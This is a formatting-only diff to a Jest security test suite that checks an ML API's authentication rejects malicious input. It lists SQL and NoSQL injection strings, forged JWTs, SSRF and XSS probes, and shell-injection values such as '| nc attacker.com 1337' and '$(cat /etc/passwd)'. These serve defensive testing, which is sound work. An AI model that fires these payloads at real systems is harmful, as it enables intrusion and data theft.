@@ -20,7 +20,7 @@ import { createTestUser, createTestTokens } from '../utils/jwtTestUtils';
 
 // Mock dependencies for controlled testing
 jest.mock('../../middleware/rateLimiter', () => ({
-  apiLimiter: jest.fn((req, res, next) => next())
+  apiLimiter: jest.fn((req, res, next) => next()),
 }));
 
 jest.mock('../../utils/logger', () => ({
@@ -28,11 +28,13 @@ jest.mock('../../utils/logger', () => ({
     info: jest.fn(),
     error: jest.fn(),
     warn: jest.fn(),
-    debug: jest.fn()
-  }
+    debug: jest.fn(),
+  },
 }));
 
-const mockedAuthenticate = authenticate as jest.MockedFunction<typeof authenticate>;
+const mockedAuthenticate = authenticate as jest.MockedFunction<
+  typeof authenticate
+>;
 const mockedApiLimiter = apiLimiter as jest.MockedFunction<typeof apiLimiter>;
 
 describe('ML Authentication Security Tests', () => {
@@ -65,7 +67,7 @@ describe('ML Authentication Security Tests', () => {
       // Mock authentication to set a different user
       const otherUser = createTestUser({
         id: 'other-user-id',
-        email: 'other@example.com'
+        email: 'other@example.com',
       });
 
       mockedAuthenticate.mockImplementation((req: any, res, next) => {
@@ -91,8 +93,8 @@ describe('ML Authentication Security Tests', () => {
         email: 'regular@example.com',
         profile: {
           ...createTestUser().profile!,
-          consentToMLTraining: false // Limited privileges
-        }
+          consentToMLTraining: false, // Limited privileges
+        },
       });
 
       mockedAuthenticate.mockImplementation((req: any, res, next) => {
@@ -113,12 +115,11 @@ describe('ML Authentication Security Tests', () => {
     it('should enforce authentication on all protected endpoints', async () => {
       const protectedEndpoints = [
         { method: 'get', path: '/api/ml/queue' },
-        { method: 'post', path: '/api/ml/models/test/warm-up' }
+        { method: 'post', path: '/api/ml/models/test/warm-up' },
       ];
 
       for (const endpoint of protectedEndpoints) {
-        await request(app)[endpoint.method](endpoint.path)
-          .expect(401);
+        await request(app)[endpoint.method](endpoint.path).expect(401);
       }
     });
 
@@ -127,13 +128,11 @@ describe('ML Authentication Security Tests', () => {
         res.status(401).json({
           success: false,
           message: 'Chybí autentizační token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
-      const response = await request(app)
-        .get('/api/ml/queue')
-        .expect(401);
+      const response = await request(app).get('/api/ml/queue').expect(401);
 
       // Error should not reveal system internals
       expect(response.body).not.toHaveProperty('stack');
@@ -149,14 +148,14 @@ describe('ML Authentication Security Tests', () => {
       const weakTokens = [
         'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJ0ZXN0In0.', // None algorithm
         'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0', // Missing signature
-        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0.weak' // Weak signature
+        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0.weak', // Weak signature
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -172,13 +171,14 @@ describe('ML Authentication Security Tests', () => {
 
     it('should enforce secure token validation', async () => {
       // Test with tampered payload
-      const tamperedPayload = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20ifQ.signature';
+      const tamperedPayload =
+        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20ifQ.signature';
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -192,13 +192,14 @@ describe('ML Authentication Security Tests', () => {
 
     it('should handle algorithm confusion attacks', async () => {
       // Test with different algorithm
-      const rsaToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0.invalid';
+      const rsaToken =
+        'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0.invalid';
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -217,15 +218,15 @@ describe('ML Authentication Security Tests', () => {
         "'; DROP TABLE users; --",
         "' OR '1'='1",
         "' UNION SELECT * FROM users --",
-        "\"; DELETE FROM sessions; --",
-        "' OR 1=1 --"
+        '"; DELETE FROM sessions; --',
+        "' OR 1=1 --",
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -245,14 +246,14 @@ describe('ML Authentication Security Tests', () => {
         '{"$ne": null}',
         '{"$regex": ".*"}',
         '{"$where": "this.password"}',
-        '{"$gt": ""}'
+        '{"$gt": ""}',
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -272,14 +273,14 @@ describe('ML Authentication Security Tests', () => {
         '$(cat /etc/passwd)',
         '; cat /etc/hosts',
         '| nc attacker.com 1337',
-        '&& whoami'
+        '&& whoami',
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -304,7 +305,7 @@ describe('ML Authentication Security Tests', () => {
           return res.status(429).json({
             success: false,
             message: 'Too many requests',
-            source: 'RateLimit'
+            source: 'RateLimit',
           });
         }
         next();
@@ -338,9 +339,7 @@ describe('ML Authentication Security Tests', () => {
 
     it('should implement secure defaults', async () => {
       // Public endpoints should be minimal
-      const response = await request(app)
-        .get('/api/ml/health')
-        .expect(200);
+      const response = await request(app).get('/api/ml/health').expect(200);
 
       // Should not expose sensitive information
       expect(response.body.data).not.toHaveProperty('config');
@@ -356,7 +355,7 @@ describe('ML Authentication Security Tests', () => {
         res.status(500).json({
           success: false,
           message: 'Chyba autentizace',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -367,13 +366,13 @@ describe('ML Authentication Security Tests', () => {
 
       expect(response.body).not.toHaveProperty('stack');
       expect(response.body).not.toHaveProperty('trace');
-      expect(JSON.stringify(response.body)).not.toMatch(/Error: .+ at .+:\d+:\d+/);
+      expect(JSON.stringify(response.body)).not.toMatch(
+        /Error: .+ at .+:\d+:\d+/
+      );
     });
 
     it('should not expose server information in headers', async () => {
-      const response = await request(app)
-        .get('/api/ml/health')
-        .expect(200);
+      const response = await request(app).get('/api/ml/health').expect(200);
 
       // Should not expose server technology
       expect(response.headers).not.toHaveProperty('x-powered-by');
@@ -382,9 +381,7 @@ describe('ML Authentication Security Tests', () => {
 
     it('should handle invalid HTTP methods securely', async () => {
       // Test unsupported HTTP methods
-      const response = await request(app)
-        .patch('/api/ml/health')
-        .expect(404);
+      const response = await request(app).patch('/api/ml/health').expect(404);
 
       expect(response.body).not.toContain('stack');
     });
@@ -396,14 +393,14 @@ describe('ML Authentication Security Tests', () => {
       const vulnerableTokens = [
         'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
         'null.null.null',
-        'undefined.undefined.undefined'
+        'undefined.undefined.undefined',
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -426,14 +423,14 @@ describe('ML Authentication Security Tests', () => {
         'Bearer null',
         'Bearer undefined',
         'Bearer false',
-        'Bearer 0'
+        'Bearer 0',
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -471,7 +468,7 @@ describe('ML Authentication Security Tests', () => {
           res.status(401).json({
             success: false,
             message: 'Neplatný token',
-            source: 'Auth'
+            source: 'Auth',
           });
         })
         .mockImplementationOnce((req: any, res, next) => {
@@ -501,7 +498,7 @@ describe('ML Authentication Security Tests', () => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -520,14 +517,14 @@ describe('ML Authentication Security Tests', () => {
         'Bearer ../../../etc/passwd',
         'Bearer <script>alert("xss")</script>',
         'Bearer ${7*7}',
-        'Bearer {{7*7}}'
+        'Bearer {{7*7}}',
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -548,14 +545,14 @@ describe('ML Authentication Security Tests', () => {
         'Bearer http://localhost:22/ssh',
         'Bearer http://169.254.169.254/metadata',
         'Bearer file:///etc/passwd',
-        'Bearer ftp://internal.server/file'
+        'Bearer ftp://internal.server/file',
       ];
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -600,13 +597,16 @@ describe('ML Authentication Security Tests', () => {
     });
 
     it('should handle concurrent authentication attacks', async () => {
-      const attackTokens = Array.from({ length: 100 }, (_, i) => `invalid-token-${i}`);
+      const attackTokens = Array.from(
+        { length: 100 },
+        (_, i) => `invalid-token-${i}`
+      );
 
       mockedAuthenticate.mockImplementation((req, res) => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -632,7 +632,7 @@ describe('ML Authentication Security Tests', () => {
         res.status(401).json({
           success: false,
           message: 'Neplatný token',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -656,16 +656,22 @@ describe('ML Authentication Security Tests', () => {
 
   describe('Response Security', () => {
     it('should not expose sensitive information in responses', async () => {
-      const response = await request(app)
-        .get('/api/ml/health')
-        .expect(200);
+      const response = await request(app).get('/api/ml/health').expect(200);
 
       const responseString = JSON.stringify(response.body);
 
       // Should not contain sensitive keywords
       const sensitiveKeywords = [
-        'password', 'secret', 'key', 'token', 'credential',
-        'private', 'internal', 'config', 'env', 'database'
+        'password',
+        'secret',
+        'key',
+        'token',
+        'credential',
+        'private',
+        'internal',
+        'config',
+        'env',
+        'database',
       ];
 
       sensitiveKeywords.forEach(keyword => {
@@ -678,7 +684,7 @@ describe('ML Authentication Security Tests', () => {
         res.status(500).json({
           success: false,
           message: 'Chyba autentizace',
-          source: 'Auth'
+          source: 'Auth',
         });
       });
 
@@ -699,7 +705,7 @@ describe('ML Authentication Security Tests', () => {
       const responses = [
         await request(app).get('/api/ml/health').expect(200),
         await request(app).get('/api/ml/status').expect(200),
-        await request(app).get('/api/ml/models').expect(200)
+        await request(app).get('/api/ml/models').expect(200),
       ];
 
       responses.forEach(response => {
